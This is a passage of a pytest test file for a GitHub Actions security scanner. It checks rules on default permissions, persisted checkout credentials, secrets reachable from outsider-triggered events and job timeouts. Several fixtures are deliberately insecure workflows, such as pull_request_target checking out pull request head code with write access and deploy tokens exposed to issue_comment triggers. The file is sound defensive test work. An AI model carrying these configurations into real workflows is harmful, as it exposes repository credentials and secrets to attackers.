        "github/codeql-action/init@v3": "LOW",
        "actions/setup-python@main": "LOW",
        "actions/reusable/.github/workflows/x.yml@v1": "LOW",
        "actions/cache/./@v4": "HIGH",
        "actions//checkout@v4": "HIGH",
        "someorg/action@v1": "HIGH",
        "tj-actions/changed-files@v45": "HIGH",
        "actions/checkout@${{ inputs.ref }}": "HIGH",
        "actions-rs/toolchain@v1": "HIGH",
        "github-actions/foo@v1": "HIGH",
    }


def _workflow_findings(tmp_path, text, rule_id):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True, exist_ok=True)
    assert write_text_no_symlink(workflows / "ci.yml", text.lstrip(), encoding="utf-8")
    return [f for f in scan_github_actions(tmp_path) if f["rule_id"] == rule_id]


_TWO_JOBS = """
name: ci
on: push
{workflow_permissions}jobs:
  build:
    runs-on: ubuntu-latest
{build_permissions}    steps:
      - run: make
  test:
    runs-on: ubuntu-latest
{test_permissions}    steps:
      - run: make test
"""
_JOB_READ = "    permissions:\n      contents: read\n"


def test_missing_permissions_are_one_workflow_finding_naming_inheriting_jobs(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        _TWO_JOBS.format(workflow_permissions="", build_permissions="", test_permissions=""),
        "SKY-D291",
    )
    assert [(f["line"], f["value"]) for f in findings] == [(1, "default_permissions")]
    assert "jobs build, test run with the repository's default" in findings[0]["message"]


def test_missing_workflow_permissions_with_every_job_scoped_is_not_reported(tmp_path):
    text = _TWO_JOBS.format(
        workflow_permissions="", build_permissions=_JOB_READ, test_permissions=_JOB_READ
    )
    assert _workflow_findings(tmp_path, text, "SKY-D291") == []


def test_missing_workflow_permissions_names_only_the_inheriting_job(tmp_path):
    text = _TWO_JOBS.format(
        workflow_permissions="", build_permissions=_JOB_READ, test_permissions=""
    )
    findings = _workflow_findings(tmp_path, text, "SKY-D291")
    assert len(findings) == 1
    assert "job test run with" in findings[0]["message"]
    assert "build" not in findings[0]["message"]


@pytest.mark.parametrize(
    ("build_permissions", "expected"),
    [("", ["contents:write"]), (_JOB_READ, [])],
)
def test_workflow_write_grant_is_reported_only_when_several_jobs_inherit_it(
    tmp_path, build_permissions, expected
):
    text = _TWO_JOBS.format(
        workflow_permissions="permissions:\n  contents: write\n",
        build_permissions=build_permissions,
        test_permissions="",
    )
    findings = _workflow_findings(tmp_path, text, "SKY-D291")
    assert [f["value"] for f in findings] == expected
    if expected:
        assert findings[0]["line"] == 4


def test_job_write_all_points_at_that_jobs_permissions(tmp_path):
    text = _TWO_JOBS.format(
        workflow_permissions="permissions: {}\n",
        build_permissions=_JOB_READ,
        test_permissions="    permissions: write-all\n",
    )
    findings = _workflow_findings(tmp_path, text, "SKY-D291")
    assert [(f["value"], f["line"]) for f in findings] == [("test:write-all", 13)]


_CHECKOUT_JOB = """
name: ci
on: {trigger}
jobs:
  build:
    runs-on: ubuntu-latest
{permissions}    steps:
      - uses: actions/checkout@v4
{checkout_with}{later}"""


def _persisted(tmp_path, *, trigger="push", permissions="", checkout_with="", later=""):
    text = _CHECKOUT_JOB.format(
        trigger=trigger,
        permissions=permissions,
        checkout_with=checkout_with,
        later=later,
    )
    return _workflow_findings(tmp_path, text, "SKY-D293")


_WRITE = "    permissions:\n      contents: write\n"
_THIRD_PARTY = "      - uses: someorg/deploy@v1\n"


@pytest.mark.parametrize(
    "case",
    [
        {},
        {"later": "      - run: make\n"},
        {"permissions": _WRITE, "later": "      - uses: actions/setup-node@v4\n"},
        {"permissions": _WRITE, "later": "      - uses: ./.github/actions/local\n"},
        {"permissions": "    permissions:\n      id-token: write\n", "later": _THIRD_PARTY},
        {"later": _THIRD_PARTY},
        {
            "permissions": _WRITE,
            "checkout_with": "        with:\n          persist-credentials: false\n",
            "later": _THIRD_PARTY,
        },
        {"trigger": "pull_request_target", "later": "      - run: make\n"},
        {"trigger": "issue_comment", "permissions": "    permissions:\n      issues: write\n"},
    ],
)
def test_persisted_checkout_without_exposure_evidence_is_not_reported(tmp_path, case):
    assert _persisted(tmp_path, **case) == []


def test_persisted_write_token_beside_later_third_party_action_is_reported(tmp_path):
    findings = _persisted(tmp_path, permissions=_WRITE, later=_THIRD_PARTY)
    assert [f["line"] for f in findings] == [9]
    assert "contents write access" in findings[0]["message"]
    assert "someorg/deploy@v1" in findings[0]["message"]


def test_persisted_checkout_of_pull_request_code_on_untrusted_trigger_is_reported(
    tmp_path,
):
    findings = _persisted(
        tmp_path,
        trigger="pull_request_target",
        checkout_with=(
            "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        ),
        later="      - run: make\n",
    )
    assert len(findings) == 1
    assert "pull_request_target" in findings[0]["message"]


def _upload(ref, path, extra=""):
    return (
        f"      - uses: actions/upload-artifact@{ref}\n"
        f"        with:\n          name: site\n          path: {path}\n{extra}"
    )


@pytest.mark.parametrize(
    ("later", "checkout_with", "reported"),
    [
        (_upload("v4.3.6", "."), "", True),
        (_upload("v3", "${{ github.workspace }}"), "", True),
        (_upload("de0fac2e4500dabe0009e67214ff5f5447ce83dd", "./"), "", True),
        (_upload("v4", ".", "          include-hidden-files: true\n"), "", True),
        (_upload("v4", "."), "", False),
        (_upload("v5.0.0", "."), "", False),
        (_upload("v4.3.6", "dist/"), "", False),
        (_upload("v4.3.6", "src"), "        with:\n          path: src\n", True),
        (_upload("v4.3.6", "src/dist"), "        with:\n          path: src\n", False),
    ],
)
def test_persisted_checkout_uploaded_as_artifact(tmp_path, later, checkout_with, reported):
    findings = _persisted(tmp_path, later=later, checkout_with=checkout_with)
    assert bool(findings) is reported
    if reported:
        assert "as an artifact" in findings[0]["message"]


_SECRET_JOB = """
name: ci
on: {trigger}
jobs:
  deploy:
    runs-on: ubuntu-latest
{job_extra}    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{{{ secrets.DEPLOY_TOKEN }}}}
"""


@pytest.mark.parametrize(
    ("trigger", "job_extra"),
    [
        ("push", ""),
        ("schedule", ""),
        ("workflow_dispatch", ""),
        ("release", ""),
        ("pull_request", ""),
        ("\n  pull_request_target:\n    types: [labeled]", ""),
        ("issue_comment", "    environment: production\n"),
        (
            "issue_comment",
            "    if: github.event.comment.author_association == 'OWNER'\n",
        ),
    ],
)
def test_secret_in_job_only_writers_can_start_is_not_reported(tmp_path, trigger, job_extra):
    text = _SECRET_JOB.format(trigger=trigger, job_extra=job_extra)
    assert _workflow_findings(tmp_path, text, "SKY-D299") == []


@pytest.mark.parametrize("trigger", ["issue_comment", "pull_request_target", "issues"])
def test_secret_in_job_outsiders_can_start_is_reported(tmp_path, trigger):
    text = _SECRET_JOB.format(trigger=trigger, job_extra="")
    findings = _workflow_findings(tmp_path, text, "SKY-D299")
    assert [f["value"] for f in findings] == ["deploy:DEPLOY_TOKEN"]
    assert trigger in findings[0]["message"]


_TIMEOUT_JOB = """
name: ci
on: {trigger}
jobs:
  publish:
    runs-on: {runner}
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@{checkout}
{checkout_with}      - run: make release
"""
_PR_HEAD = "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"


@pytest.mark.parametrize(
    ("trigger", "runner", "checkout_with", "reported"),
    [
        ("release", "ubuntu-latest", "", False),
        ("push", "ubuntu-latest", "", False),
        ("pull_request_target", "ubuntu-latest", "", False),
        ("release", "[self-hosted, linux]", "", False),
        ("pull_request_target", "ubuntu-latest", _PR_HEAD, True),
    ],
)
def test_privileged_job_timeout_is_reported_only_when_the_default_does_not_bound_it(
    tmp_path, trigger, runner, checkout_with, reported
):
    text = _TIMEOUT_JOB.format(
        trigger=trigger,
        runner=runner,
        checkout="de0fac2e4500dabe0009e67214ff5f5447ce83dd",
        checkout_with=checkout_with,
    )
    assert bool(_workflow_findings(tmp_path, text, "SKY-D313")) is reported
